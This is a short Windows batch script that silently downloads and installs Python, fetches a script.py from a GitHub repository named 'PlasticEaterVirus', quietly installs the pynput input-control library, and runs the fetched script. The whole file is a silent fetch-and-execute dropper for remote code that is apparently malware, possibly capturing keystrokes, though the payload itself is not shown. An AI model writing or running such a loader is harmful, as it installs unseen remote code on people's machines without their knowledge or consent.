@ECHO OFF
cd C:\PlasticEater
curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
pythonInstaller.exe /quiet
curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.py -L -O -s
py -m pip install pynput --quiet
py script.py
pause